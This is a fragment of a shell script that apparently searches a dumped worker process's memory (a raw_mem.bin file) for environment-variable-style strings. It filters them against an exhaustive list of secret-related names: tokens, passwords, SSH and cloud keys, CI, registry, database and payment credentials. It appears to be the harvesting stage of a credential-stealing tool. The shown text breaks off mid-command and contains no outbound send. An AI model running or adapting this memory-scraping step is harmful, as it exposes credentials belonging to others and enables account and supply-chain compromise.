...
`)
  ...
  if [ -s "$_d/worker_mem/raw_mem.bin" ]; then
    ...
    grep -E '^[A-Z_]{2,}=.{8,}' "$_d/worker_mem/strings.txt" 2>/dev/null | \
      grep -iE '(SECRET|TOKEN|PASSWORD|PASSW|PASSWD|PASS_|_PASS=|PWD|KEY[_=]|PRIVATE|CREDENTIAL|CRED_|PAT[_=]|FLAG|AUTH|OAUTH|OIDC|JWT|SAML|SSO|API_KEY|APIKEY|ACCESS_KEY|SIGNING|CERT|PEM|SSH|PGP|GPG|RSA|KUBE|KUBECONFIG|DOCKER|REGISTRY|HELM|AWS|AZURE|GCP|GCLOUD|GOOGLE_|DIGITALOCEAN|VAULT|CONSUL|TERRAFORM|ANSIBLE|DB_|DATABASE|POSTGRES|MYSQL|MONGO|REDIS|CASSANDRA|ELASTICSEARCH|SMTP|SENDGRID|MAILGUN|TWILIO|SLACK|DISCORD|WEBHOOK|PROXY|SOCKS|VPN|TUNNEL|STRIPE|PAYPAL|BRAINTREE|DATADOG|NEWRELIC|SENTRY|PAGERDUTY|CLOUDFLARE|NPM_TOKEN|PYPI|NUGET|MAVEN|CARGO|RUBYGEMS|GIT_TOKEN|GITHUB|GITLAB|BITBUCKET|JENKINS|CIRCLECI|CODECOV|SONAR|SNYK|JFROG|ARTIFACTORY|NEXUS|HARBOR|S3_|GCS_|BLOB_|STORAGE|CDN|KRB|CCACHE|KEYTAB|ENCRYPT|CIPHER|HASH|SALT|SEED|PIN_|_PIN=|NONCE|HMAC|BEARER|REFRESH|CLIENT_SECRET|APP_SECRET|DEPLOY|RELEASE|PUBLISH|UPLOAD|DOWNLOAD|HOOK_|CALLBACK|ENDPOINT|CONN_STR|DSN|JDBC|LDAP|RADIUS|OKTA|AUTH0|FIREBASE|SUPABASE|VERCEL|NETLIFY|HEROKU|FLY_|RENDER_)' | \
